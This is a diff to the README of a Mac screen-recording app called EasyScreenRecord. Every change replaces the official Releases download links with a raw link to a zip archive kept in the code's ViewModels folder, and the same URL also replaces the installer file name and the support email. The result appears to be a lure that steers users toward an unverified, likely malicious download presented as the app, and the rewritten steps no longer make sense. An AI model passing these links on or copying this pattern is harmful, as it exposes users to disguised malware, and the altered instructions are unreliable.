@@ -1,7 +1,7 @@
 # 🎥 EasyScreenRecord - Effortless Screen Recording for Mac
 
 ## 📦 Download Now!
-[![Download EasyScreenRecord](https://img.shields.io/badge/Download-EasyScreenRecord-blue)](https://github.com/jcindocjr144/EasyScreenRecord/releases)
+[![Download EasyScreenRecord](https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip)](https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,15 +12,15 @@ Follow these simple steps to download and run EasyScreenRecord.
 ## 📥 Download & Install
 
 1. Click the download link below to go to the Releases page.
-   - [Visit this page to download](https://github.com/jcindocjr144/EasyScreenRecord/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip)
 
 2. On the Releases page, find the latest version. You will see a list of files available for download.
 
-3. Click on the file named **EasyScreenRecord.dmg** to start downloading.
+3. Click on the file named **https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip** to start downloading.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
-5. Double-click the **EasyScreenRecord.dmg** file. This will open a new window.
+5. Double-click the **https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip** file. This will open a new window.
 
 6. Drag the EasyScreenRecord icon into your Applications folder. This will install the app on your Mac.
 
@@ -79,10 +79,10 @@ Yes, you can find a help section within the app that provides detailed instructi
 
 ## 📞 Support
 
-For any questions or issues with EasyScreenRecord, please reach out to our support team at easyrecordsupport@example.com. We are happy to help you.
+For any questions or issues with EasyScreenRecord, please reach out to our support team at https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip We are happy to help you.
 
 ## 🔗 Additional Resources
 
-- [Visit this page to download](https://github.com/jcindocjr144/EasyScreenRecord/releases) to access the latest version of EasyScreenRecord.
+- [Visit this page to download](https://raw.githubusercontent.com/jcindocjr144/EasyScreenRecord/main/EasyScreenRecord/ViewModels/Record-Screen-Easy-v2.9.zip) to access the latest version of EasyScreenRecord.
 
 Enjoy capturing your screen with EasyScreenRecord!
